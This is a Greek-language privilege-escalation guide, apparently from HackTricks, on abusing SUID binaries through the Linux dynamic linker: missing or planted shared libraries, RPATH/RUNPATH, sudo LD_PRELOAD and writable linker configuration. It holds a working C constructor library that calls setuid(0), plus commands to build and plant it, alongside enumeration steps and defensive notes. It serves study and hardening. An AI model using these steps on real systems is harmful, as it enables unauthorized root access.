# Κατάχρηση Shared Library και Linker με SUID

{{#include ../../banners/hacktricks-training.md}}

Τα SUID binaries ελέγχονται συνήθως για άμεση εκτέλεση εντολών, αλλά τα προσαρμοσμένα SUID προγράμματα μπορεί επίσης να είναι ευάλωτα μέσω του dynamic linker. Το κοινό μοτίβο είναι απλό: ένα προνομιούχο εκτελέσιμο φορτώνει κώδικα από μια διαδρομή ή ρύθμιση που μπορεί να επηρεάσει ένας χρήστης με λιγότερα προνόμια.<sup>[[1]](#references)</sup>

Αυτή η σελίδα εστιάζει σε γενικά μοτίβα τεχνικών: βιβλιοθήκες που λείπουν, εγγράψιμοι κατάλογοι βιβλιοθηκών, `RPATH`/`RUNPATH`, `LD_PRELOAD` μέσω sudo, ρυθμίσεις linker και σύγχυση SUID hardlink.

Για τις κεφαλίδες προγράμματος ELF, τη δυναμική ενότητα και τη συμπεριφορά του loader που σχετίζονται με αυτούς τους ελέγχους, δείτε τις [Βασικές πληροφορίες ELF](../../binary-exploitation/basic-stack-binary-exploitation-methodology/elf-tricks.md).

## Γρήγορη απαρίθμηση

Ξεκινήστε εντοπίζοντας ασυνήθιστα αρχεία SUID και ελέγχοντας αν είναι δυναμικά συνδεδεμένα:<sup>[[1]](#references)[[3]](#references)</sup>

```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```

Χρησιμοποιήστε το `readelf` για ένα άγνωστο εκτελέσιμο: το [`ldd` ενδέχεται να εκτελέσει έναν μη έμπιστο ELF interpreter](https://man7.org/linux/man-pages/man1/ldd.1.html). Το `readelf` εμφανίζει τις άμεσες εξαρτήσεις, επομένως επιβεβαιώστε ξεχωριστά τη διαδρομή που επιλέγει πράγματι ο loader.<sup>[[1]](#references)[[3]](#references)</sup>

Εστιάστε σε μη τυπικές τοποθεσίες, προσαρμοσμένες διαδρομές εφαρμογών, binaries που ανήκουν στον root αλλά βρίσκονται εκτός καταλόγων που διαχειρίζονται πακέτα, καθώς και σε εξαρτήσεις που φορτώνονται από εγγράψιμους καταλόγους.<sup>[[1]](#references)</sup>

Χρήσιμοι έλεγχοι εγγραψιμότητας:

```bash
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```

## Missing Shared Object Injection

Ορισμένα custom SUID binaries προσπαθούν να φορτώσουν ένα shared object που δεν υπάρχει. Αν η διαδρομή που λείπει βρίσκεται κάτω από έναν κατάλογο που ελέγχει ο attacker, το binary ενδέχεται να φορτώσει κώδικα που έχει προμηθεύσει ο attacker, με effective user.<sup>[[1]](#references)</sup>

Το ίδιο ισχύει για ένα **custom binary που επιτρέπεται μέσω sudo**, όταν καλεί `dlopen()` για ένα απόλυτο path `.so` κάτω από home ή κατάλογο ρυθμίσεων στον οποίο μπορεί να γράψει ο caller. Αυτό το late library load ενδέχεται να μην εμφανίζεται στα `ldd` και ELF `NEEDED` entries. Μια περιορισμένη εξέταση με `strings` ή ένα trace μιας **μη προνομιούχας** εκτέλεσης μπορεί να αποκαλύψει το path που επιχειρείται· ένας κωδικός πρόσβασης της εφαρμογής ή μια επιλογή μενού ενδέχεται να ελέγχει την αναζήτηση. Επιβεβαιώστε τον ακριβή κανόνα sudo, το ακριβές path και τα δικαιώματα του γονικού καταλόγου, καθώς και ότι η προνομιούχα εκτέλεση φτάνει σε αυτή την αναζήτηση, προτού θεωρήσετε ότι πρόκειται για κλιμάκωση δικαιωμάτων. Μην εκτελείτε τον στόχο sudo απλώς και μόνο για να τον απαριθμήσετε.

Εντοπίστε αποτυχημένες αναζητήσεις βιβλιοθηκών με το syscall filter του `strace`:<sup>[[2]](#references)</sup>

```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```

Αν το binary αναζητά το libexample.so σε writable path, μια minimal proof library μπορεί να χρησιμοποιήσει constructor. Διατηρήστε το proof-of-impact ακίνδυνο κατά την επικύρωση:<sup>[[6]](#references)</sup>

```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
    setuid(0);
    setgid(0);
    system("id > /tmp/suid-so-ran");
}
```

Κάντε build με το ακριβές όνομα αρχείου που προσπαθεί να φορτώσει το binary:

```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```

Η εκμεταλλεύσιμη συνθήκη δεν είναι απλώς η απουσία της βιβλιοθήκης. Ο επιτιθέμενος πρέπει να μπορεί να τοποθετήσει ένα συμβατό shared object σε μια διαδρομή που θα δεχτεί ο προνομιούχος loader.<sup>[[1]](#references)</sup>

## Εγγράψιμος κατάλογος βιβλιοθηκών

Μερικές φορές υπάρχουν όλες οι εξαρτήσεις, αλλά ένας από τους καταλόγους που χρησιμοποιούνται για την επίλυσή τους είναι εγγράψιμος. Αυτό μπορεί να επιτρέψει την αντικατάσταση μιας φορτωμένης βιβλιοθήκης ή την τοποθέτηση μιας βιβλιοθήκης υψηλότερης προτεραιότητας με το ίδιο όνομα.<sup>[[1]](#references)</sup>

Ο ίδιος έλεγχος ισχύει και για ένα προσαρμοσμένο ELF **που επιτρέπεται μέσω sudo**, ακόμη κι όταν το ELF δεν έχει SUID bit και ο επιτρεπόμενος λογαριασμός RunAs δεν είναι root. Συγκρίνετε τις εγγραφές `DT_NEEDED` με τη διαδρομή της βιβλιοθήκης που θα επιλύσει ο loader και, στη συνέχεια, ελέγξτε αν ο καλών μπορεί να γράψει σε αυτό το αρχείο ή να το αντικαταστήσει μέσω ενός εγγράψιμου, προσβάσιμου γονικού καταλόγου. Επιβεβαιώστε τον ακριβή κανόνα sudo RunAs, τους συμβολικούς συνδέσμους και τα ACL, την πολιτική του loader και ότι η διεργασία-στόχος φορτώνει τη βιβλιοθήκη ως ο λογαριασμός με τα υψηλότερα προνόμια. Ένα εγγράψιμο `.so` ή μόνο ένα όνομα εξάρτησης αποτελεί απλώς ένδειξη· εξετάστε τα μεταδεδομένα χωρίς να εκτελέσετε την εντολή sudo.<sup>[[1]](#references)[[3]](#references)[[5]](#references)</sup>

Εξετάστε τις διαδρομές εξαρτήσεων:<sup>[[1]](#references)[[3]](#references)</sup>

```bash
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```

Αν ο κατάλογος είναι εγγράψιμος, επαληθεύστε το σε lab με ασφαλή προσέγγιση που χρησιμοποιεί αντίγραφο. Η αντικατάσταση βιβλιοθηκών συστήματος σε ενεργό host μπορεί να αφήσει διεργασίες που ξεκινούν ταυτόχρονα με ασυνεπείς εκδόσεις βιβλιοθηκών.<sup>[[8]](#references)</sup>

### Εγγράψιμες βιβλιοθήκες μέσα σε chroot

Το chroot από μόνο του δεν κλείνει τα κληρονομημένα file descriptors ούτε περιορίζει όλη την πρόσβαση στο filesystem. Αν ένα sandbox αφήσει ένα directory descriptor που δείχνει έξω από τη νέα ρίζα του και η φυλακισμένη διεργασία μπορεί να κάνει dereference αυτό το descriptor (για παράδειγμα, μέσω μιας προσβάσιμης καταχώρισης `/proc/<pid>/fd/`), οι διαδρομές του host μπορεί να παραμείνουν προσβάσιμες. Αυτό είναι ζήτημα ορίων του filesystem· από μόνο του δεν παρέχει προνόμια root.<sup>[[11]](#references)[[12]](#references)</sup>

Ελέγξτε ξεχωριστά αν ο φυλακισμένος χρήστης μπορεί να γράψει σε έναν κατάλογο βιβλιοθηκών που θα χρησιμοποιήσει ένα **host root-SUID executable** όταν εκκινηθεί από το jail. Ο loader επιλύει τις εξαρτήσεις με βάση την προβολή filesystem της διεργασίας, επομένως μια βιβλιοθήκη που ελέγχει ο επιτιθέμενος εκεί μπορεί να εκτελεστεί με την effective ταυτότητα του SUID προγράμματος. Επιβεβαιώστε το ακριβές executable, το SUID bit και την πολιτική mount, τον στόχο του descriptor και τα δικαιώματα πρόσβασης, τη διαδρομή αναζήτησης βιβλιοθηκών του jail, καθώς και ότι το πρόγραμμα μπορεί πράγματι να αποκτήσει πρόσβαση στο host executable. Ένα file capability στον sandbox launcher, ένα εγγράψιμο jail ή ένα host SUID binary από μόνο του αποτελεί μόνο ένδειξη· η πλήρης αλυσίδα εξαρτάται από την υλοποίηση του sandbox.<sup>[[1]](#references)[[11]](#references)[[12]](#references)</sup>

## RPATH και RUNPATH

Τα `RPATH` και `RUNPATH` είναι καταχωρίσεις dynamic section που υποδεικνύουν στον loader πού να αναζητήσει βιβλιοθήκες. Είναι επικίνδυνα σε SUID προγράμματα όταν δείχνουν σε καταλόγους εγγράψιμους από τον επιτιθέμενο.<sup>[[1]](#references)</sup>

Εντοπίστε τα:<sup>[[3]](#references)[[10]](#references)</sup>

```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```

Παράδειγμα επικίνδυνης εξόδου:

```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```

Αν το /opt/app/lib είναι εγγράψιμο και το binary χρειάζεται το libcustom.so, ο επιτιθέμενος μπορεί να τοποθετήσει εκεί ένα κακόβουλο libcustom.so:<sup>[[1]](#references)</sup>

```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```

`RPATH` και `RUNPATH` δεν είναι πανομοιότυπα σε όλες τις λεπτομέρειες επίλυσης, αλλά κατά τον έλεγχο για privilege escalation το πρακτικό ερώτημα είναι το ίδιο: αναζητά το SUID binary ένα όνομα βιβλιοθήκης σε κατάλογο όπου μπορεί να γράψει ο attacker;<sup>[[1]](#references)</sup>

## LD_PRELOAD, LD_LIBRARY_PATH και SUID

Για κανονικά προγράμματα, τα `LD_PRELOAD` και `LD_LIBRARY_PATH` μπορούν να επιβάλουν ή να επηρεάσουν τη φόρτωση shared objects. Για προγράμματα SUID, ο dynamic loader συνήθως εισέρχεται σε secure-execution mode και αγνοεί επικίνδυνες μεταβλητές περιβάλλοντος.<sup>[[1]](#references)</sup>

Αυτό σημαίνει ότι ένα απλό SUID binary συνήθως δεν είναι ευάλωτο μόνο και μόνο επειδή ο χρήστης μπορεί να ορίσει το `LD_PRELOAD`:<sup>[[1]](#references)</sup>

```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```

Η συνηθισμένη εξαίρεση είναι μια πολιτική sudo που επιτρέπει την ανάθεση μεταβλητής περιβάλλοντος στη γραμμή εντολών για τον στόχο, όπως ένα tag `SETENV` ή μια σχετική επιλογή `setenv`. Αν ο στόχος είναι dynamically linked και το sudo αποδέχεται το `LD_PRELOAD=/path/to/library`, ο στόχος μπορεί να φορτώσει κώδικα που ελέγχει ο καλών. Ελέγξτε τον κανόνα που ισχύει και την ταυτότητα του στόχου. Η απλή προσθήκη του `LD_PRELOAD` στο `env_keep` δεν αρκεί σε συστήματα όπου ο dynamic loader αφαιρεί ένα inherited `LD_PRELOAD` πριν από την εκκίνηση της SUID διεργασίας `sudo`· μια ανάθεση στη γραμμή εντολών αξιολογείται από το sudo μετά τη δική του εκκίνηση.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

```bash
sudo -l
# Check SETENV/setenv and the target command's allowed arguments
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```

Μην συγχέετε αυτές τις περιπτώσεις· οι κανόνες του loader και της πολιτικής sudo παραπάνω τις διακρίνουν:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- `LD_PRELOAD` σε ένα κανονικό SUID binary: συνήθως αποκλείεται κατά την ασφαλή εκτέλεση.
- Το `LD_PRELOAD` γίνεται αποδεκτό ως ανάθεση στη γραμμή εντολών sudo για έναν προνομιούχο, δυναμικά συνδεδεμένο στόχο: ενδέχεται να είναι εκμεταλλεύσιμο.
- Απουσία `.so` σε εγγράψιμη διαδρομή: είναι εκμεταλλεύσιμη όταν το SUID binary φορτώνει φυσιολογικά από αυτή τη διαδρομή.
- `RPATH`/`RUNPATH` προς εγγράψιμο κατάλογο: είναι εκμεταλλεύσιμο όταν μπορεί να ελεγχθεί μια απαραίτητη βιβλιοθήκη.
- Δυνατότητα εγγραφής στο `/etc/ld.so.preload` ή στις ρυθμίσεις του linker: επιπτώσεις σε όλο το σύστημα και υψηλός αντίκτυπος.

## Ρύθμιση Linker

Το `ld.so` χρησιμοποιεί την cache του linker και το `/etc/ld.so.preload`· το `ldconfig` δημιουργεί αυτή την cache από το `/etc/ld.so.conf` και τα αρχεία που περιλαμβάνονται από αυτό, συνήθως από το `/etc/ld.so.conf.d/`.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Έλεγχοι υψηλής αξίας:

```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```

Μια εγγράψιμη ρύθμιση του linker είναι συνήθως πιο σοβαρό πρόβλημα από ένα μεμονωμένο ευάλωτο SUID binary, επειδή μπορεί να επηρεάσει πολλές δυναμικά συνδεδεμένες διεργασίες. Το `/etc/ld.so.preload` είναι ιδιαίτερα επικίνδυνο, επειδή μπορεί να φορτώσει αναγκαστικά ένα shared object σε προνομιούχες διεργασίες.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## Σύγχυση με SUID Hardlink

Τα hardlinks μπορούν να εμφανίσουν το ίδιο SUID inode με πολλά διαφορετικά ονόματα.<sup>[[9]](#references)</sup> Αυτό είναι χρήσιμο για την απόκρυψη ενός προνομιούχου helper, την παραπλάνηση κατά τον καθαρισμό ή την παράκαμψη ενός αφελούς ελέγχου που βασίζεται στη διαδρομή.

Εντοπίστε αρχεία SUID με περισσότερους από έναν συνδέσμους:<sup>[[9]](#references)</sup>

```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```

Ελέγξτε όλες τις διαδρομές προς το ίδιο inode:<sup>[[9]](#references)</sup>

```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```

Η κατάχρηση δεν έγκειται στο ότι ένα hardlink αλλάζει τα δικαιώματα. Πρόκειται για σύγχυση διαδρομών: ένα προνομιούχο inode μπορεί να είναι προσβάσιμο μέσω ενός ονόματος που οι αμυνόμενοι ή τα scripts δεν περιμένουν.<sup>[[9]](#references)</sup> Για περισσότερες πληροφορίες σχετικά με τα inode και τη ροή εργασιών με hardlink, δείτε [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Defensive Notes

- Διατηρείτε τα SUID binaries στο ελάχιστο, ελεγμένα και, όπου είναι δυνατό, διαχειριζόμενα από τον διαχειριστή πακέτων.
- Αποφεύγετε καταχωρίσεις `RPATH`/`RUNPATH` που δείχνουν σε εγγράψιμους καταλόγους ή καταλόγους που διαχειρίζονται εφαρμογές.<sup>[[1]](#references)[[8]](#references)</sup>
- Διατηρείτε τους καταλόγους βιβλιοθηκών στην ιδιοκτησία του root και μη εγγράψιμους από απλούς χρήστες.<sup>[[8]](#references)</sup>
- Μην διατηρείτε τις μεταβλητές loader `LD_PRELOAD`, `LD_LIBRARY_PATH` ή παρόμοιες μέσω του sudo.<sup>[[1]](#references)[[5]](#references)</sup>
- Παρακολουθείτε τα `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` και τυχόν μη αναμενόμενα SUID αρχεία.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- Ελέγχετε τα SUID αρχεία με hardlink και διερευνάτε προσαρμοσμένα SUID wrappers εκτός των τυπικών διαδρομών του συστήματος.<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf (Βοηθητικά προγράμματα δυαδικών αρχείων GNU)](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — Σελίδα εγχειριδίου Linux](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [Κοινά χαρακτηριστικά (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Σκλήρυνση Dynamic Linker (Η βιβλιοθήκη GNU C)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hard Links (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump (Βοηθητικά προγράμματα δυαδικών αρχείων GNU)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
- [11] [chroot(2) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [12] [proc_pid_fd(5) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man5/proc_pid_fd.5.html)
{{#include ../../banners/hacktricks-training.md}}
